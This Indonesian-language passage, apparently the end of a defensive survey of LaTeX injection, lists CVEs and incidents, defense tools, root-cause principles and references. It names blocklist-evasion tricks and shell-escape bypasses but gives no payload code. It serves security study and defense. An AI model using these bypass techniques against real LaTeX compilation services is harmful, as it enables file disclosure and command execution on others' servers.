| Path traversal aspell Overleaf | CVE-2024-45312 | **Sedang.** Path file sembarang dalam pemuatan kamus aspell di Overleaf CE/SP < 5.0.7 |
| §2 + §9-2 (file read + exfiltration) | Advisory LaTeX Indico (GHSA-67cx-rhhq-mfhq) | **Tinggi.** Local file disclosure melalui bypass sanitasi LaTeX di Indico |
| §1 (RCE langsung) | Tea LaTeX 1.0 (EDB-48805) | **Kritis.** RCE tanpa autentikasi pada aplikasi web Tea LaTeX |
| §1 + §2 + §5 (beberapa vektor pada layanan online) | Studi "Can You Accept LaTeX Files" (2021) | **Tinggi.** Sebagian besar layanan LaTeX online rentan terhadap information disclosure; hanya layanan yang di-sandbox yang tahan |
| §1-3 (bypass restricted shell escape `mpost -tex`) | TeX Live restricted shell escape | **Tinggi.** Eksekusi command sembarang meskipun dalam restricted shell mode via parameter `-tex` milik `mpost` |

---

## §11. Alat Deteksi dan Pertahanan

| Alat / Pendekatan | Tipe | Teknik Inti |
|---|---|---|
| **Flag `--no-shell-escape`** | Konfigurasi engine | Menonaktifkan `\write18` dan pipe input; pertahanan utama tetapi dapat di-bypass via bug engine (§5-1) |
| **Mode `--shell-restricted`** | Konfigurasi engine | Membatasi `\write18` ke command yang di-whitelist; dapat di-bypass via penyalahgunaan program yang di-whitelist (§1-3) |
| **Mode `--safer` (LuaTeX)** | Konfigurasi engine | Menonaktifkan library I/O dan debug Lua; merusak pemuatan font; memiliki bypass via `package.loaded` |
| **Sandboxing Docker/container** | Infrastruktur | Mengisolasi kompilasi dalam container ephemeral; pertahanan paling efektif — membatasi blast radius semua teknik |
| **Profil seccomp / AppArmor** | Level OS | Membatasi system call yang tersedia untuk proses TeX; mencegah eksekusi shell dan akses jaringan |
| **Konfigurasi `openin_any` / `openout_any`** | Konfigurasi TeX | Mengontrol cakupan file I/O: `a` (any), `r` (restricted ke subtree), `p` (paranoid — tanpa dotfile) |
| **Secure Plain TeX** | Reimplementasi | Subset TeX yang dibatasi yang hanya mengizinkan control sequence typesetting; menghilangkan akses I/O dan shell |
| **Sanitasi input (blocklist)** | Level aplikasi | Pemblokiran regex/keyword pada command berbahaya; pada dasarnya tidak dapat diandalkan karena teknik evasion §4 |
| **Sanitasi input (allowlist)** | Level aplikasi | Hanya mengizinkan kumpulan command aman yang telah ditentukan; lebih kuat daripada blocklist tetapi membatasi pengguna |
| **PayloadsAllTheThings LaTeX Injection** | Repositori payload | Koleksi referensi payload LaTeX injection untuk pengujian |
| **Timeout kompilasi + batas sumber daya** | Infrastruktur | `ulimit`, cgroup, atau batas sumber daya container untuk memitigasi serangan DoS §6 |

---

## §12. Ringkasan: Prinsip Inti

### Akar Penyebab

LaTeX injection ada karena TeX dirancang sebagai **lingkungan pemrograman lokal, tepercaya, single-user** yang kebetulan menghasilkan dokumen typeset. File I/O, sistem macro, dan antarmuka shellnya adalah fitur, bukan bug, dalam konteks penciptaannya di tahun 1978. Krisis keamanan muncul dari penerapan model kepercayaan tahun 1978 ini dalam konteks tahun 2025: layanan web multi-tenant, input pengguna yang tidak tepercaya, dan server kompilasi yang terhubung ke jaringan.

### Mengapa Perbaikan Inkremental Gagal

Setiap mitigasi yang dicoba di level TeX telah secara sistematis dihindari:

1. **`--no-shell-escape`** di-bypass oleh `debug.getupvalue` LuaTeX (CVE-2023-32700), dan file I/O tetap tidak dibatasi.
2. **`--shell-restricted`** di-bypass oleh injeksi `mpost -tex` dan fitur pipe `epstopdf`.
3. **Command blocklist** dikalahkan oleh manipulasi `\catcode`, encoding hex `^^XX`, konstruksi `\csname`, obfuscation `\def`, dan dispatch environment `\begin`/`\end` — salah satunya saja sudah cukup untuk menghindari blocklist terbatas apa pun.
4. **Package blocklist** tidak dapat mengimbangi ribuan paket LaTeX yang menyediakan fitur file I/O atau interaksi sistem.

Masalah fundamentalnya adalah bahwa **Turing completeness TeX membuat pembatasan subset apa pun menjadi tidak dapat diputuskan**. Secara umum, tidak mungkin untuk menentukan apakah program TeX yang diberikan akan mengeksekusi operasi berbahaya tanpa benar-benar menjalankannya — dan menjalankan kode yang tidak tepercaya adalah persis apa yang ingin dicegah oleh mitigasi ini.

### Solusi Struktural

Satu-satunya pertahanan yang dapat diandalkan adalah **defense in depth melalui isolasi**:

1. **Container sandboxing**: Kompilasi setiap dokumen dalam container ephemeral yang terisolasi dari jaringan dengan akses filesystem minimal. Ini adalah pendekatan yang digunakan oleh layanan yang diamankan dengan baik seperti Overleaf (Docker) dan Papeeria (container per kompilasi).
2. **Batas sumber daya**: Terapkan kuota waktu CPU, memori, dan disk untuk memitigasi denial of service.
3. **Konfigurasi engine minimal**: Gunakan `--no-shell-escape` (masih berguna melawan serangan biasa), pengaturan `openin_any`/`openout_any` yang ketat, dan versi engine yang terkini.
4. **Sanitasi output**: Validasi dan sanitasi output PDF yang dikompilasi sebelum disajikan untuk mencegah XSS dan eksekusi JavaScript yang disematkan.
5. **Hindari LaTeX untuk input yang tidak tepercaya sepenuhnya**: Jika memungkinkan, gunakan alternatif yang dibatasi (MathJax sisi klien, KaTeX) alih-alih kompilasi LaTeX sisi server penuh untuk konten matematika yang dikendalikan pengguna.

Pelajaran dari LaTeX injection adalah pelajaran umum: **Format dokumen Turing-complete tidak dapat diproses dengan aman dari sumber yang tidak tepercaya tanpa isolasi level proses.** Prinsip yang sama berlaku untuk PostScript, macro Microsoft Office, dan format "dokumen" lain yang secara diam-diam merupakan bahasa pemrograman.

---

## Referensi

- Checkoway, S., Shacham, H., & Rescorla, E. (2010). *Don't take LaTeX files from strangers.* ;login: USENIX Magazine.
- Lacombe, G., Masalygina, K., Tahiri, A., Adam, C., & Lauradoux, C. (2021). *Can You Accept LaTeX Files from Strangers? Ten Years Later.* arXiv:2102.00856.
- Chernoff, M. (2023). *LuaTeX Security Vulnerabilities.* https://www.maxchernoff.ca/p/luatex-vulnerabilities
- CVE-2023-32700: Eksekusi shell command sembarang LuaTeX via debug.getupvalue.
- CVE-2023-32668: Akses jaringan default-enabled luasocket LuaTeX.
- CVE-2024-29073: Blocklist LaTeX Anki yang tidak lengkap (bypass verbatiminput).
- CVE-2024-45312: Manipulasi path kamus aspell Overleaf.
- CVE-2025-59035: XSS Indico via rendering math LaTeX.
- CVE-2018-1999024: XSS MathJax via macro \unicode.
- PayloadsAllTheThings — LaTeX Injection. https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/
- Practical CTF — LaTeX. https://book.jorianwoltjer.com/languages/latex
- HackTricks — Formula/CSV/Doc/LaTeX/GhostScript Injection. https://book.hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html
- scumjr (2016). *Pwning coworkers thanks to LaTeX.* https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/
- 0day.work. *Hacking with LaTeX.* https://0day.work/hacking-with-latex/
- sk3rts.rocks. *Bypassing LaTeX Filters.* https://sk3rts.rocks/posts/bypassing-latex-filters/
- Talos Intelligence. TALOS-2024-1992 (Kerentanan LaTeX Anki).
- Exploit Database. EDB-48805 (RCE Tea LaTeX 1.0).
- OWASP ASVS Issue #1559: Tambahkan LaTeX injection ke pemeriksaan Formula Injection.

---

*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*